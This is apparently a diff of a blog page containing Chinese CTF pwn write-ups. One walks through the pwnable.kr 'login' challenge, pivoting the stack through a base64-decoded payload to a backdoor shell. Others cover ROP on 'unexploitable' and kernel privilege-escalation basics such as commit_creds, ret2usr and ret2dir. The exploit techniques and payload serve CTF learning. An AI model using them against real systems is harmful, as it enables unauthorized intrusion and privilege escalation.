+<p>▲题外话：最开始Base64搞不懂哪个是输入，哪个是输出，直接经过调试就可以判断。况且最开始的v4是0，总不能程序永远都将0进行base64解码然给到我们的输入地址中吧。但是调试的时候发现，每次输入相同的值，但是解码后得到的v4的值却是不一样的。这就纳闷了，为什么一样的输入四个AAAA得到的解码值不一样呢，难道程序还有个随机变量不成。之后再仔细调试发现这个base64decode有点不一样，虽然传入的两个参数都是地址，但是第一个参数的操作却是从该地址直接取值进行解码，然后对于第二个参数的操作却并不是将解码结果给到第二个参数，而是再开辟一块堆内存，之后将该堆内存的地址给到第二个参数。所以每次解码后第二个参数，也就是栈上的一个值，总是不一样，因为这里保存的是一个随机生成的堆地址，而不是解码后的值。同样之后观察main函数中的memcpy也可以发现：memcpy(&amp;input, v4, v6);而memcpy的原型是：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">void *memcpy(void *dest, const void *src, size_t n)</span><br></pre></td></tr></table></div></figure>
+
+<p>前两个参数类型都应该是地址才对，而这里却直接将v4的值给传进去，那不就说明v4的值是一个地址吗。然后再跳转到汇编代码分析一波:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">.text:080493B3   call _memset</span><br><span class="line">.text:080493B8   mov dword ptr [esp+18h], 0</span><br><span class="line">.text:080493C0   lea eax, [esp+18h]</span><br><span class="line">.text:080493C4   mov [esp+4], eax</span><br><span class="line">.text:080493C8   lea eax, [esp+1Eh]</span><br><span class="line">.text:080493CC   mov [esp], eax</span><br><span class="line">.text:080493CF   call Base64Decode</span><br></pre></td></tr></table></div></figure>
+
+<p>同样Base64Decode函数的两个参数也都是地址，这里是直接取栈地址给到eax，然后再将eax的值给相应esp指向的栈内存。所以可以看到Base64Decode取值应该是从栈上取两个地址才对，分别位于main函数栈的是esp+4和esp。所以如果这里有个格式化字符串那么就完全可以泄露处出栈地址，之后就完全可控，可惜没有。还是回到正轨分析吧。</p>
+<p>2.所以经过前面分析，程序要求我们输入一个base64编码过的字符串，随后会进行解码并且复制到位于bss段的全局变量input中，最后使用auth函数进行验证，通过后进入带有后门的correct()打开shell。并且由于长度有限制：所以我们的输入base64解码后最多只能有12个字节。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">if ( v6 &gt; 12 )</span><br><span class="line">&#123;</span><br><span class="line">    puts(&quot;Wrong Length&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>3.汇总一下，程序存在栈溢出，但只能溢出4个字节，也就是一个地址，也就是最多只能覆盖到ebp，然后存在后门函数。由于没办法直接覆盖返回地址，所以这里就在ebp上做文章，使用栈劫持技术。之前的栈劫持可以用rop，但是这里没办法，因为无法进行返回地址覆盖。但是还有一个地方，就是我们的输入最后会被解码赋值给input，这个input是个全局变量，不受到ASLR影响，而又可以控制12个字节，如果可以把栈挪移到这个地方，那么就是可控了。</p>
+<p>栈模型如下：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548702.png" alt="img"><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548716.png" alt="img"></p>
+<p>可控栈如下：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548659.png" alt="img"></p>
+<p>4.总体思路应该是：</p>
+<p>①劫持auth函数的栈底到input_addr，那么auth函数在退出到main函数时，main函数栈的栈底就不会回到之前的main函数栈栈底，而是会挪移到我们input_addr，也就是payload3的值。</p>
+<p>②开始执行auth函数中的退出操作，到leave时，执行操作leave的第一步汇编操作mov esp ebp，将栈顶指向ebp指向的内容，此时ebp已经被修改成了payload3，而payload3会被赋值成Input_addr，也就是esp会指向input_addr。</p>
+<p>②执行leave第二步汇编指令pop ebp，将当前栈顶的值赋值给ebp，也就是ebp的值会变成payload1，(这里的payload1没什么作用，可以随便填)之后esp由于pop，esp+0x4，会往栈底移动一个地址，移动到指向我们输入的payload2处。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548823.png" alt="img"></p>
+<p>④之后retn执行，实际指令为pop eip，也就是将当前栈顶数据给eip，也就是eip被赋值为我们payload中的payload2。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548769.png" alt="img"></p>
+<p>⑤最后执行retn的第二条实际指令：jmp eip，此时eip就已经是payload2的值，所以将该payload2设置为correct函数地址或者是system(“/bin/sh”);就可以getshell。</p>
+<p>总的来说，就是利用leave和retn两个操作来劫持eip的值，使其直接指向后门函数，一步getshell。</p>
+<p>5.创建payload，组成应该是：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">#首先确定地址：</span><br><span class="line">correct_addr = 0x08049278</span><br><span class="line">input_addr = 0x0811eb40</span><br></pre></td></tr></table></div></figure>
+
+<p>之后确定payload的组成：</p>
+<p>payload = padding + eip + input_addr。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload = &quot;aaaa&quot;				#padding</span><br><span class="line">payload += p32(0x08049284)		</span><br><span class="line">#system(&quot;/bin/sh&quot;)地址，整个payload被复制到bss上，栈劫持后retn时栈顶在这里</span><br><span class="line">payload += p32(0x0811eb40)		#新的eip地址</span><br></pre></td></tr></table></div></figure>
+
+<p>最后得注意发送的是base64编码之后的payload。</p>
+<p>参考资料:</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 </div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/pwnable.kr-unexploitable/">pwnable.kr-unexploitable</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec，只开启了NX。IDA打开找漏洞，程序很简单，读入数据栈溢出，可以读取1295个字节，但是buf只有0x10h大小，所以可以溢出足够长的数据。</p>
 <p>2.程序没有后门，没有导入system函数，没有binsh字符串，也没有write、put、printf之类的可以泄露libc的函数，没办法ROP，然后ROPgadget也搜不到syscall。这里换用另一种工具ropper来搜索：ropper –file=unexploitable –search “syscall”，可以搜到一个。有了syscall，可以尝试用rop来给寄存器赋值然后开shell，但是这里还是搜不到给rsi，rdi等寄存器赋值的gadget，这就意味着我们也没办法直接通过ROP实现getshell。</p>
 <p>3.如果没有开NX，直接栈劫持然后shellcode就完事了，但是开启了NX，没办法shellcode。</p>
@@ -439,47 +343,126 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></he
 
 <p>参考资料：</p>
 <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/pwnable.kr-login/">pwnable.kr-login</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec一下，开了canary和NX，然后IDA打开分析漏洞。发现auth函数中可能存在栈溢出：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">int v4; // [esp+20h] [ebp-8h]</span><br><span class="line">------------------------------------</span><br><span class="line">memcpy(&amp;v4, &amp;input, a1);</span><br></pre></td></tr></table></div></figure>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/pwn-kernel_%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/">pwn-kernel_前置知识</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、内核前置基础知识：</p>
+<p>1.physmap：</p>
+<p>physmap是内核管理的一块非常大的连续的虚拟内存空间，为了提高效率，该空间地址和RAM地址直接映射。RAM相对physmap要小得多，导致了任何一个RAM地址都可以在physmap中找到其对应的虚拟内存地址，而用户空间的虚拟内存也会映射到RAM。</p>
+<p>所以可能会形成如下关系：</p>
+<p>usr_data—&gt;RAM—-&gt;physmap</p>
+<p>那么physmap中就有可能会保存usr_data，那么就为提权代码放到内核空间提供了前置条件，同时有mmap就可能会导致条件竞争。</p>
+<p>2.ioctl：系统调用，用于与设备通信</p>
+<p>由于内核和用户空间隔离开，所以就需要一个接口来使得用户可以在一定情况下访问内核空间：</p>
+<p>int ioctl(int fd, unsigned long request, …)</p>
+<p>第一个参数为打开设备 (open) 返回的文件描述符，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。</p>
+<p>3.状态转换相关操作：</p>
+<p>当发生系统调用，产生异常，外设产生中断等事件时，会发生用户态到内核态的切换</p>
+<p>ENTRY(entry_SYSCALL_64)</p>
+<p>(1).用户态至内核态：</p>
+<p>①swapgs指令触发，切换到kernel GS：</p>
+<p>SWAPGS_UNSAFE_STACK</p>
+<p>②保存栈值，设置内核栈：</p>
+<p>movq %rsp, PER_CPU_VAR(rsp_scratch)</p>
+<p>movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</p>
+<p>③压栈保存寄存器：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#注释头 </span><br><span class="line"></span><br><span class="line">/* Construct struct pt_regs on stack */</span><br><span class="line">pushq  $__USER_DS      /* pt_regs-&gt;ss */</span><br><span class="line">pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */</span><br><span class="line">pushq  %r11             /* pt_regs-&gt;flags */</span><br><span class="line">pushq  $__USER_CS      /* pt_regs-&gt;cs */</span><br><span class="line">pushq  %rcx             /* pt_regs-&gt;ip */</span><br><span class="line">pushq  %rax             /* pt_regs-&gt;orig_ax */</span><br><span class="line">pushq  %rdi             /* pt_regs-&gt;di */</span><br><span class="line">pushq  %rsi             /* pt_regs-&gt;si */</span><br><span class="line">pushq  %rdx             /* pt_regs-&gt;dx */</span><br><span class="line">pushq  %rcx tuichu    /* pt_regs-&gt;cx */</span><br><span class="line">pushq  $-ENOSYS        /* pt_regs-&gt;ax */</span><br><span class="line">pushq  %r8              /* pt_regs-&gt;r8 */</span><br><span class="line">pushq  %r9              /* pt_regs-&gt;r9 */</span><br><span class="line">pushq  %r10             /* pt_regs-&gt;r10 */</span><br><span class="line">pushq  %r11             /* pt_regs-&gt;r11 */</span><br><span class="line">sub $(6*8), %rsp      /* pt_regs-&gt;bp, bx, r12-15 not saved */</span><br></pre></td></tr></table></div></figure>
 
-<p>如果a1大于8h，而我们可以控制input，那么就可以造成栈溢出。再往上翻一下，发现就是将我们的输入通过一系列操作给到input，然后a1是input的长度。</p>
-<p>实际情况是将我们的输入给s，进行Base64解码，然后给v4，长度给v6。v4又给input，v6传值到达auth函数赋值给a1。这里input是全局变量，所以auth函数中的input中的内容其实就是我们输入经过base64解码的内容。</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">_isoc99_scanf(&quot;%30s&quot;, &amp;s);</span><br><span class="line">--------------------------------------------------</span><br><span class="line">v6 = Base64Decode((int)&amp;s, &amp;v4);</span><br><span class="line">--------------------------------------------------</span><br><span class="line">memcpy(&amp;input, v4, v6);</span><br><span class="line">------------------------------------------------------</span><br><span class="line">auth(v6) == 1</span><br></pre></td></tr></table></div></figure>
+<p>④判断类型并跳转：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">movq PER_CPU_VAR(current_task), %r11</span><br><span class="line">testl $_TIF_WORK_SYSCALL_ENTRY|_TIF_ALLWORK_MASK, TASK_TI_flags(%r11)</span><br><span class="line">jnz entry_SYSCALL64_slow_path</span><br></pre></td></tr></table></div></figure>
 
-<p>▲题外话：最开始Base64搞不懂哪个是输入，哪个是输出，直接经过调试就可以判断。况且最开始的v4是0，总不能程序永远都将0进行base64解码然给到我们的输入地址中吧。但是调试的时候发现，每次输入相同的值，但是解码后得到的v4的值却是不一样的。这就纳闷了，为什么一样的输入四个AAAA得到的解码值不一样呢，难道程序还有个随机变量不成。之后再仔细调试发现这个base64decode有点不一样，虽然传入的两个参数都是地址，但是第一个参数的操作却是从该地址直接取值进行解码，然后对于第二个参数的操作却并不是将解码结果给到第二个参数，而是再开辟一块堆内存，之后将该堆内存的地址给到第二个参数。所以每次解码后第二个参数，也就是栈上的一个值，总是不一样，因为这里保存的是一个随机生成的堆地址，而不是解码后的值。同样之后观察main函数中的memcpy也可以发现：memcpy(&amp;input, v4, v6);而memcpy的原型是：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">void *memcpy(void *dest, const void *src, size_t n)</span><br></pre></td></tr></table></div></figure>
+<p>▲</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">entry_SYSCALL64_slow_path:</span><br><span class="line">  /* IRQs are off. */</span><br><span class="line">  SAVE_EXTRA_REGS</span><br><span class="line">  movq    %rsp, %rdi</span><br><span class="line">  call    do_syscall_64        /* returns with IRQs disabled */</span><br></pre></td></tr></table></div></figure>
 
-<p>前两个参数类型都应该是地址才对，而这里却直接将v4的值给传进去，那不就说明v4的值是一个地址吗。然后再跳转到汇编代码分析一波:</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">.text:080493B3   call _memset</span><br><span class="line">.text:080493B8   mov dword ptr [esp+18h], 0</span><br><span class="line">.text:080493C0   lea eax, [esp+18h]</span><br><span class="line">.text:080493C4   mov [esp+4], eax</span><br><span class="line">.text:080493C8   lea eax, [esp+1Eh]</span><br><span class="line">.text:080493CC   mov [esp], eax</span><br><span class="line">.text:080493CF   call Base64Decode</span><br></pre></td></tr></table></div></figure>
+<p>(2)内核态至用户态：</p>
+<p>①swapgs恢复GS</p>
+<p>②iretq（加上寄存器信息）或sysretq，如果使用 iretq 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）</p>
+<p>kernel 的 crash 通常会引起重启</p>
+<p>4.相关保护技术Mitigation：</p>
+<p>(1)SMAP和SMEP保护技术：</p>
+<p>(arm里面叫PXN(Privilege Execute Never)和PAN(Privileged Access Never))</p>
+<p>①SMAP:禁止内核访问用户空间的数据(Supervisor Mode Access Prevention)</p>
+<p>②SMEP:禁止内核执行用户空间的代码(Supervisor Mode Execution Prevention)</p>
+<p>内核命令行中添加nosmap和nosmep禁用</p>
+<p>(2)kernel canary:</p>
+<p>编译内核时设置CONFIG_CC_STACKPROTECTOR，可以起到类似于stack canary的技术。</p>
+<p>(3)KALSR：内核地址随机化</p>
+<p>5.提权代码与函数结构体：</p>
+<p>cred结构体：kernel用cred结构体记录进程权限(每个结构都有一个cred结构)，保存了进程的相关信息，如果利用这个cred就可以提权。一般调用commit_creds(prepare_kernel_cred(0))完成提权然后用户态“着陆”起shell。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">struct cred &#123;</span><br><span class="line">    atomic_t    usage;</span><br><span class="line">#ifdef CONFIG_DEBUG_CREDENTIALS</span><br><span class="line">    atomic_t    subscribers;           /* number of processes subscribed */</span><br><span class="line">    void        *put_addr;</span><br><span class="line">    unsigned    magic;</span><br><span class="line">#define CRED_MAGIC  0x43736564</span><br><span class="line">#define CRED_MAGIC_DEAD 0x44656144</span><br><span class="line">#endif</span><br><span class="line">    kuid_t      uid;                   /* real UID of the task */</span><br><span class="line">    kgid_t      gid;                   /* real GID of the task */</span><br><span class="line">    kuid_t      suid;                  /* saved UID of the task */</span><br><span class="line">    kgid_t      sgid;                  /* saved GID of the task */</span><br><span class="line">    kuid_t      euid;                  /* effective UID of the task */</span><br><span class="line">    kgid_t      egid;                  /* effective GID of the task */</span><br><span class="line">    kuid_t      fsuid;                 /* UID for VFS ops */</span><br><span class="line">    kgid_t      fsgid;                 /* GID for VFS ops */</span><br><span class="line">    unsigned    securebits;            /* SUID-less security management */</span><br><span class="line">    kernel_cap_t    cap_inheritable;   /* caps our children can inherit */</span><br><span class="line">    kernel_cap_t    cap_permitted;     /* caps we&#x27;re permitted */</span><br><span class="line">    kernel_cap_t    cap_effective;     /* caps we can actually use */</span><br><span class="line">    kernel_cap_t    cap_bset;          /* capability bounding set */</span><br><span class="line">    kernel_cap_t    cap_ambient;       /* Ambient capability set */</span><br><span class="line">#ifdef CONFIG_KEYS</span><br><span class="line">    unsigned char   jit_keyring;       /* default keyring to attach requested</span><br><span class="line">    /* keys to */</span><br><span class="line">    struct key __rcu *session_keyring; /* keyring inherited over fork */</span><br><span class="line">    struct key  *process_keyring;      /* keyring private to this process */</span><br><span class="line">    struct key  *thread_keyring;       /* keyring private to this thread */</span><br><span class="line">    struct key  *request_key_auth;     /* assumed request_key authority */</span><br><span class="line">#endif</span><br><span class="line">#ifdef CONFIG_SECURITY</span><br><span class="line">    void        *security;             /* subjective LSM security */</span><br><span class="line">#endif</span><br><span class="line">    struct user_struct *user;          /* real user ID subscription */</span><br><span class="line">    struct user_namespace *user_ns;    /* user_ns the caps and keyrings are relative to. */</span><br><span class="line">    struct group_info *group_info;     /* supplementary groups for euid/fsgid */</span><br><span class="line">    struct rcu_head rcu;               /* RCU deletion hook */</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></div></figure>
 
-<p>同样Base64Decode函数的两个参数也都是地址，这里是直接取栈地址给到eax，然后再将eax的值给相应esp指向的栈内存。所以可以看到Base64Decode取值应该是从栈上取两个地址才对，分别位于main函数栈的是esp+4和esp。所以如果这里有个格式化字符串那么就完全可以泄露处出栈地址，之后就完全可控，可惜没有。还是回到正轨分析吧。</p>
-<p>2.所以经过前面分析，程序要求我们输入一个base64编码过的字符串，随后会进行解码并且复制到位于bss段的全局变量input中，最后使用auth函数进行验证，通过后进入带有后门的correct()打开shell。并且由于长度有限制：所以我们的输入base64解码后最多只能有12个字节。</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">if ( v6 &gt; 12 )</span><br><span class="line">&#123;</span><br><span class="line">    puts(&quot;Wrong Length&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>不同内核版本的cred结构体可能不太一样。</p>
+<p>二、内核态函数及相关变化：</p>
+<p>1.printf() -&gt; printk()，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 dmesg 查看效果</p>
+<p>2.malloc() -&gt; kmalloc()，内核态的内存分配函数，和malloc()相似，但使用的是slab/slub分配器。</p>
+<p>3.free() -&gt; kfree()，同 kmalloc()</p>
+<p>4.memcpy() -&gt; copy_from_user()/copy_to_user()</p>
+<p>5.copy_from_user() 实现了将用户空间的数据传送到内核空间</p>
+<p>6.copy_to_user() 实现了将内核空间的数据传送到用户空间</p>
+<p>7.提权相关函数：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">int commit_creds(struct cred *new)</span><br><span class="line">struct cred* prepare_kernel_cred(struct task_struct* daemon)</span><br></pre></td></tr></table></div></figure>
 
-<p>3.汇总一下，程序存在栈溢出，但只能溢出4个字节，也就是一个地址，也就是最多只能覆盖到ebp，然后存在后门函数。由于没办法直接覆盖返回地址，所以这里就在ebp上做文章，使用栈劫持技术。之前的栈劫持可以用rop，但是这里没办法，因为无法进行返回地址覆盖。但是还有一个地方，就是我们的输入最后会被解码赋值给input，这个input是个全局变量，不受到ASLR影响，而又可以控制12个字节，如果可以把栈挪移到这个地方，那么就是可控了。</p>
-<p>栈模型如下：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548702.png" alt="img"><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548716.png" alt="img"></p>
-<p>可控栈如下：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548659.png" alt="img"></p>
-<p>4.总体思路应该是：</p>
-<p>①劫持auth函数的栈底到input_addr，那么auth函数在退出到main函数时，main函数栈的栈底就不会回到之前的main函数栈栈底，而是会挪移到我们input_addr，也就是payload3的值。</p>
-<p>②开始执行auth函数中的退出操作，到leave时，执行操作leave的第一步汇编操作mov esp ebp，将栈顶指向ebp指向的内容，此时ebp已经被修改成了payload3，而payload3会被赋值成Input_addr，也就是esp会指向input_addr。</p>
-<p>②执行leave第二步汇编指令pop ebp，将当前栈顶的值赋值给ebp，也就是ebp的值会变成payload1，(这里的payload1没什么作用，可以随便填)之后esp由于pop，esp+0x4，会往栈底移动一个地址，移动到指向我们输入的payload2处。</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548823.png" alt="img"></p>
-<p>④之后retn执行，实际指令为pop eip，也就是将当前栈顶数据给eip，也就是eip被赋值为我们payload中的payload2。</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548769.png" alt="img"></p>
-<p>⑤最后执行retn的第二条实际指令：jmp eip，此时eip就已经是payload2的值，所以将该payload2设置为correct函数地址或者是system(“/bin/sh”);就可以getshell。</p>
-<p>总的来说，就是利用leave和retn两个操作来劫持eip的值，使其直接指向后门函数，一步getshell。</p>
-<p>5.创建payload，组成应该是：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">#首先确定地址：</span><br><span class="line">correct_addr = 0x08049278</span><br><span class="line">input_addr = 0x0811eb40</span><br></pre></td></tr></table></div></figure>
+<p>执行commit_creds(prepare_kernel_cred(0))即可获得 root 权限</p>
+<p>函数地址可在/proc/kallsyms，老版本/proc/ksyms中查看(cat|grep)，权限一般需要root</p>
+<p>三、保护绕过技术：</p>
+<p>1.ret2usr:</p>
+<p>在没有SMAP/SMEP的情况下把内核指针重定向到用户空间的漏洞利用方式被称为ret2usr</p>
+<p>2.ret2dir：</p>
+<p>如果用户空间用mmap()把提权代码映射到内存RAM，那么就可以在physmap里找到其对应的副本，就可以修改EIP跳到副本执行，这种利用方式被称为ret2dir。</p>
+<p>3.kernel canary:</p>
+<p>绕过方法同用户空间的canary绕过大致相同，编译内核时设置CONFIG_CC_STACKPROTECTOR，可以起到类似于stack canary的技术。</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/pwn%E4%B8%ADlibc%E7%89%88%E6%9C%AC%E5%88%87%E6%8D%A2%E7%BC%96%E8%AF%91/">pwn中libc版本切换编译</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、手动编译</p>
+<p>1.下载对应libc的源码：以2.32为例：glibc-2.32.tar.gz</p>
+<p>(1)官网：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ftp.gnu.org/gnu/glibc/" >https://ftp.gnu.org/gnu/glibc/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>(2)清华镜像源：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/gnu/glibc/" >https://mirrors.tuna.tsinghua.edu.cn/gnu/glibc/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>2.解压，然后新建文件夹来存储编译结果：</p>
